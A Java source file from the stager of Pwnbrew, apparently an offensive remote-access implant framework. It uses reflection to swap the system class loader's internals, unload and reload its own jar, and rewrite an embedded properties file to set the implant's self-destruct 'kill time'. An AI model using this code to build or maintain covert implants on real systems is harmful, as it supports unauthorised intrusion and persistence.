/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/

package stager;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URISyntaxException;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.Vector;
import java.util.jar.JarFile;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;
import static stager.Stager.DEATH_LABEL;
import static stager.Stager.STAG_PROP_FILE;
import sun.net.www.protocol.jar.JarURLConnection;

/**
 *
 *  
 * 
 */
public class LoaderUtilities {

    private static HashSet<String> setJarFileNames2Close = new HashSet<String>();    

    // ========================================================================
    /**
     *  Attempts to close the passed class loader
     * 
     * @param theLoader 
    */
    public static void unloadLibs( ClassLoader theLoader ) {
        setJarFileNames2Close.clear();
        closeClassLoader( theLoader );
        finalizeNativeLibs( theLoader );
        cleanupJarFileFactory();
    }
    
    // ========================================================================
    /**
     *  Adds the JAR to the class loader lib
     * 
     * @param aJarFile 
    */
    public static void loadLib( File aJarFile ){
        
        try {
            
            URL jarURL = aJarFile.toURI().toURL();
            URLClassLoader systemLoader = new URLClassLoader( new URL[]{ jarURL});           
            
            replaceUcp(systemLoader);

        } catch (IllegalArgumentException ex) {   
            ex = null;
        } catch (SecurityException ex) {  
            ex = null;
        } catch (IOException ex) {      
            ex = null;
        }
                    
    }
 
    // ========================================================================
    /**
    *    Cleanup jar file factory cache
    */
    private static boolean cleanupJarFileFactory(){
        
        boolean retVal = false;
        Class classJarURLConnection = JarURLConnection.class;
        if (classJarURLConnection == null) {
            return retVal;
        }
        
        Field aField = null;
        try {
            aField = classJarURLConnection.getDeclaredField("factory");
        } catch (NoSuchFieldException e) {
        //ignore
        }
        
        if (aField == null) {
            return retVal;
        }
        
        aField.setAccessible(true);
        Object anObj = null;
        try {
            anObj = aField.get(null);
        } catch (IllegalAccessException e) {
        //ignore
        }
        
        if (anObj == null) {
            return retVal;
        }
        
        Class classJarFileFactory = anObj.getClass();
        //
        HashMap fileCache = null;
        try {
            aField = classJarFileFactory.getDeclaredField("fileCache");
            aField.setAccessible(true);
            anObj = aField.get(null);
            if (anObj instanceof HashMap) {
                fileCache = (HashMap)anObj;
            }
        } catch (NoSuchFieldException e) {
        } catch (IllegalAccessException e) {
        //ignore
        }
        
        HashMap urlCache = null;
        try {
            aField = classJarFileFactory.getDeclaredField("urlCache");
            aField.setAccessible(true);
            anObj = aField.get(null);
            if (anObj instanceof HashMap) {
                urlCache = (HashMap)anObj;
            }
        } catch (NoSuchFieldException e) {
        } catch (IllegalAccessException e) {
        //ignore
        }
        
        if (urlCache != null) {
            
            HashMap urlCacheTmp = (HashMap)urlCache.clone();
            Iterator it = urlCacheTmp.keySet().iterator();
            while (it.hasNext()) {
                anObj = it.next();
                if (!(anObj instanceof JarFile)) {
                    continue;
                }
                
                JarFile aJarFile = (JarFile)anObj;
                if (setJarFileNames2Close.contains(aJarFile.getName())) {
                    try {
                        aJarFile.close();
                    } catch (IOException e) {
                    //ignore
                    }
                    if (fileCache != null) {
                        fileCache.remove(urlCache.get(aJarFile));
                    }
                    urlCache.remove(aJarFile);
                }
            }
            retVal = true;
            
        } else if (fileCache != null) {
            
            // urlCache := null
            HashMap fileCacheTmp = (HashMap)fileCache.clone();
            Iterator it = fileCacheTmp.keySet().iterator();
            while (it.hasNext()) {
                
                Object key = it.next();
                anObj = fileCache.get(key);
                if (!(anObj instanceof JarFile)) {
                    continue;
                }
                JarFile jarFile = (JarFile)anObj;
                if (setJarFileNames2Close.contains(jarFile.getName())) {
                    try {
                        jarFile.close();
                    } catch (IOException e) {
                    //ignore
                    }
                    fileCache.remove(key);
                }
            }
            retVal = true;
        }
        setJarFileNames2Close.clear();
        return retVal;
    }
 
    // ========================================================================
    /**
    *   Close jar files of the passed ClassLoader
    * 
    * @param passedLoader
    * @return
    */
    private static boolean closeClassLoader( ClassLoader passedLoader ) {
        
        boolean retVal = false;
        if (passedLoader == null) {
            return retVal;
        }
        
        Class classURLClassLoader = URLClassLoader.class;
        Field aField = null;
        try {
            aField = classURLClassLoader.getDeclaredField("ucp");
        } catch (NoSuchFieldException e1) {
        //ignore
        }
        
        if (aField != null) {
            
            aField.setAccessible(true);
            Object obj = null;
            try {
                obj = aField.get(passedLoader);
            } catch (IllegalAccessException e1) {
            //ignore
            }
            
            if (obj != null) {
                
                final Object ucp = obj;
                aField = null;
                try {
                    aField = ucp.getClass().getDeclaredField("loaders");
                } catch (NoSuchFieldException e1) {
                //ignore
                }
                
                if (aField != null) {
                    
                    aField.setAccessible(true);
                    ArrayList loaders = null;
                    try {
                        loaders = (ArrayList) aField.get(ucp);
                        retVal = true;
                    } catch (IllegalAccessException e1) {
                    //ignore
                    }
                    
                    //Loop through the loaders
                    for (int i = 0; loaders != null && i < loaders.size(); i++) {
                        
                        obj = loaders.get(i);
                        aField = null;
                        try {
                            aField = obj.getClass().getDeclaredField("jar");
                        } catch (NoSuchFieldException e) {
                        //ignore
                        }
                        
                        if (aField != null) {
                            
                            aField.setAccessible(true);
                            try {
                                obj = aField.get(obj);
                            } catch (IllegalAccessException e1) {
                            // ignore
                            }
                            
                            if (obj instanceof JarFile) {
                                final JarFile jarFile = (JarFile)obj;
                                setJarFileNames2Close.add(jarFile.getName());
                             
                                try {
                                    jarFile.close();
                                } catch (IOException e) {
                                // ignore
                                }
                            }
                        }
                    }
                }
            }
        }
        return retVal;
    }
    
    // ========================================================================
    /**
    *   Close jar files of the passed ClassLoader
    * 
    * @param passedLoader
    * @return
    */
    private static boolean replaceUcp( ClassLoader passedLoader ) {
        
        boolean retVal = false;
        if (passedLoader == null) {
            return retVal;
        }
        
        Class classURLClassLoader = URLClassLoader.class;
        Field aField = null;
        try {
            aField = classURLClassLoader.getDeclaredField("ucp");
        } catch (NoSuchFieldException ex) {
            ex = null;
        }
        
        if (aField != null) {
            
            aField.setAccessible(true);
            Object obj = null;
            try {
                obj = aField.get(passedLoader);
            } catch (IllegalAccessException ex) {
                ex = null;
            }
            
            if (obj != null) {
                
                Object replacementUCP = obj;               
                aField.setAccessible(true);
                
                try {
                    obj = aField.get(ClassLoader.getSystemClassLoader());
                } catch (IllegalAccessException ex) {
                    ex = null;
                }

                if (obj != null) {
                    
                    
                    try {
                        aField.set(ClassLoader.getSystemClassLoader(), replacementUCP);
                    } catch (IllegalArgumentException ex) {
                        ex = null;
                    } catch (IllegalAccessException ex) {
                        ex = null;
                    }
                }
            }
        }

        return retVal;
    }
 
    // ========================================================================
    /**
    *   Finalize native libraries
    * 
    * @param passedLoader 
    * @return
    */
    private static boolean finalizeNativeLibs( ClassLoader passedLoader ) {
        
        boolean retVal = false;
        Class classClassLoader = ClassLoader.class;
        Field nativeLibraries = null;
        try {
            nativeLibraries = classClassLoader.getDeclaredField("nativeLibraries");
        } catch (NoSuchFieldException e1) {
        //ignore
        }
        if (nativeLibraries == null) {
            return retVal;
        }
        nativeLibraries.setAccessible(true);
        Object obj = null;
        try {
            obj = nativeLibraries.get(passedLoader );
        } catch (IllegalAccessException e1) {
        //ignore
        }
        if (!(obj instanceof Vector)) {
            return retVal;
        }
        
        retVal = true;
        Vector vectorLib = (Vector)obj;
        for (Object lib : vectorLib) {
            
            Method finalize = null;
            try {
                finalize = lib.getClass().getDeclaredMethod("finalize", new Class[0]);
            } catch (NoSuchMethodException e) {
            //ignore
            }
            
            if (finalize != null) {
                finalize.setAccessible(true);
                try {
                    finalize.invoke(lib, new Object[0]);
                } catch (IllegalAccessException e) {
                } catch (InvocationTargetException e) {
                //ignore
                }
            }
        }
        return retVal;
    }
    
   //===========================================================================
    /**
     * 
     * @param passedFile
     * @param properties 
     * @param propLabel 
     * @param propValue 
     */
    public static void updateJarProperties( File passedFile, String properties,
            String propLabel, String propValue ) throws IOException{        
    
        if( passedFile != null && passedFile.isFile() ){                 
            
            //Open the zip
            ByteArrayOutputStream aBOS = new ByteArrayOutputStream();
            try {
                
                FileInputStream fis = new FileInputStream(passedFile);
                try{

                    //Read into the buffer
                    byte[] buf = new byte[1024];                
                    for (int readNum; (readNum = fis.read(buf)) != -1;) {
                        aBOS.write(buf, 0, readNum);
                    }

                //Close and delete
                } finally {
                    try {
                        fis.close();
                    } catch (IOException ex) {
                        ex = null;
                    }
                }
                passedFile.delete();

                //Create the file back
                FileOutputStream theFileOS = new FileOutputStream(passedFile);
                ZipOutputStream theZipOS = new ZipOutputStream(theFileOS );

                //Creat an inputstream
                ByteArrayInputStream aBIS = new ByteArrayInputStream(aBOS.toByteArray());    
                
                //Close the stream
                try {
                    aBOS.close();
                } catch (IOException ex) { ex = null;}

                //Open the zip input stream
                ZipInputStream theZipInputStream = new ZipInputStream(aBIS);
                try {
                    
                    ZipEntry anEntry;
                    while((anEntry = theZipInputStream.getNextEntry())!=null){
                        //Get the entry name
                        String theEntryName = anEntry.getName();

                        //Change the properties file
                        if( theEntryName.equals(properties) ){

                            //Get the input stream and modify the value
                            ManifestProperties localProperties = new ManifestProperties();
                            localProperties.load(theZipInputStream);

                            //Set the IP to something else
                            //Add the entry
                            anEntry = new ZipEntry(properties);
                            localProperties.setProperty(propLabel, propValue);
    

                            //Add the entry
                            theZipOS.putNextEntry(anEntry);
                            localProperties.store(theZipOS);

                            //Write to zip
                            theZipOS.closeEntry();

                            continue;
                        } 

                        //Add the entry
                        theZipOS.putNextEntry(anEntry);
                        /*
                        * After creating entry in the zip file, actually
                        * write the file.
                        */
                        int temp;
                        byte[] buffer = new byte[1024];
                        while((temp = theZipInputStream.read(buffer)) > 0) {
                            theZipOS.write(buffer, 0, temp);
                        }
                        theZipOS.closeEntry();
                    }

                    //Close the jar
                    theZipOS.flush();
                    theZipOS.close();
                    
                } finally {
                    try {
                        theZipInputStream.close();
                    } catch (IOException ex) { ex = null; }
                }
                
            } catch (FileNotFoundException ex ){
            }
        }
    }
    
     //===============================================================
    /**
    *   Performs the logic specific to the message.
    *
     * @param killTime
    */
    public static void updateKillTime( Date killTime ) {
        
        //Pass it to the manager
        try {
            
            //Get the current date
            String dateStr = "";
            if( killTime != null )
                dateStr = Long.toString( killTime.getTime() );          
                
            Class stagerClass = LoaderUtilities.class;
            ClassLoader aClassLoader = stagerClass.getClassLoader();  
            
            //Check if we are staging first
            URL ourUrl = stagerClass.getProtectionDomain().getCodeSource().getLocation();
                        
            //Check for null
            File theClassPath = new File( ourUrl.toURI() );  

            LoaderUtilities.unloadLibs( aClassLoader );
            LoaderUtilities.updateJarProperties( theClassPath, STAG_PROP_FILE, DEATH_LABEL, dateStr ); 
            LoaderUtilities.loadLib(theClassPath);            

        } catch (IllegalArgumentException ex) {
        } catch (IOException ex) {
        } catch (URISyntaxException ex) {
        }

    }

}
